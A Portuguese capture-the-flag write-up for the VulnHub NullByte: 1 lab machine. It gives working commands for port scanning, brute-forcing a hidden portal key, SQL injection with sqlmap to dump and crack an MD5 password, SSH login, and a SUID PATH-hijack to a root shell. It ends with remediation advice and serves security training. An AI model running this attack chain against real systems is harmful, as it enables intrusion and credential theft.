# NullByte: 1 — Writeup (PT-BR)

> Versão legada. O writeup completo e expandido está em [`../nullbyte-1/`](../nullbyte-1/).

| | |
|-|-|
| **IP Alvo** | 192.168.1.142 (host-only) |
| **Dificuldade** | Iniciante/Intermediário |
| **Sistema Operacional** | Linux (Debian) |
| **Flags** | proof.txt em /root |
| **Fonte** | [VulnHub](https://www.vulnhub.com/entry/nullbyte-1,126/) |

## Resumo do Ataque

`nmap` → `exiftool em main.gif (caminho oculto)` → `Burp força bruta /kzMb5nVYJw (chave=elite)` → `SQLi com sqlmap (BD seth → ramses:omega MD5)` → `SSH na porta 777` → `SUID procwatch` → `sequestro de PATH com ps → /bin/sh` → root

## Metodologia

1. Varredura completa de portas para identificar porta SSH não padrão (777)
2. Download e análise de imagem web para metadados EXIF ocultos
3. Força bruta na chave de acesso do portal web oculto
4. Injeção SQL via sqlmap para extrair credenciais
5. Login SSH com senha MD5 crackeada
6. Binário SUID abusado via manipulação de PATH

---

## Passo 1: Descoberta de Rede e Varredura de Portas

```bash
sudo netdiscover -i eth1 -r 192.168.1.0/24
nmap -A 192.168.1.142
```

Portas abertas: 80 (HTTP), 111 (RPC), 777 (SSH — não padrão), 44607.

O SSH está rodando na porta 777, não na 22.

---

## Passo 2: Metadados EXIF da Imagem

Acesse `http://192.168.1.142` e encontre `main.gif` no código-fonte da página.

```bash
wget http://192.168.1.142/main.gif
exiftool main.gif
```

A saída inclui:

```
Comment: kzMb5nVYJw
```

Este é o nome de um diretório oculto.

---

## Passo 3: Força Bruta no Portal Oculto

Acesse `http://192.168.1.142/kzMb5nVYJw/` — a página pede uma chave.

Use o Burp Suite Intruder com `rockyou.txt` no parâmetro key. A chave é:

```
elite
```

O portal em `/kzMb5nVYJw/index.php` leva para `/kzMb5nVYJw/420search.php?usrtosearch=`.

---

## Passo 4: Injeção SQL

Enumere os bancos de dados:

```bash
sqlmap -u "http://192.168.1.142/kzMb5nVYJw/420search.php?usrtosearch=1" --dbs --batch
```

Banco encontrado: `seth`

Extraia o banco:

```bash
sqlmap -u "http://192.168.1.142/kzMb5nVYJw/420search.php?usrtosearch=1" -D seth --dump-all --batch
```

Obtido: usuário `ramses`, hash de senha (MD5).

```bash
hashcat -m 0 <HASH> /usr/share/wordlists/rockyou.txt
# Senha: omega
```

---

## Passo 5: Login SSH

```bash
ssh ramses@192.168.1.142 -p 777
# Senha: omega
```

---

## Passo 6: Escalada de Privilégios — Sequestro de PATH via SUID

Enumere binários SUID:

```bash
find / -perm -u=s -type f 2>/dev/null
```

Interessante: `/var/www/backup/procwatch` — tem o bit SUID ativado.

```bash
cd /var/www/backup/
./procwatch
```

`procwatch` chama `ps` sem caminho absoluto. Crie um `ps` falso no diretório atual:

```bash
echo "/bin/sh" > ps
chmod 777 ps
export PATH=.:$PATH
./procwatch
```

Shell root obtido.

```bash
id
# uid=0(root)
cd /root
cat proof.txt
```

---

## Lições Aprendidas

1. **Metadados EXIF** em imagens podem vazar caminhos ocultos e informações internas: sempre audite arquivos de mídia.
2. **Sem CAPTCHA ou limitação de taxa** em portais web permite força bruta de chaves de acesso.
3. **SQLi via parâmetro GET não sanitizado**: use queries parametrizadas; nunca construa SQL a partir de input do usuário.
4. **Armazenamento de senha MD5** é inseguro; use bcrypt/scrypt/argon2 com salts individuais.
5. **Binário SUID chamando comandos por nome relativo** permite sequestro de PATH: sempre use caminhos absolutos em binários privilegiados.

## Remediação

| Vulnerabilidade | Correção |
|---|---|
| Divulgação de metadados EXIF | Remova metadados antes de servir imagens |
| Sem proteção contra força bruta | Limite tentativas de login; adicione CAPTCHA |
| Injeção SQL | Queries parametrizadas / prepared statements |
| Hash de senha MD5 | Use bcrypt ou Argon2 com salts únicos |
| Sequestro de PATH via SUID | Use caminhos absolutos em binários SUID; remova o bit SUID |

Thanks guys!! (❍ᴥ❍ʋ)
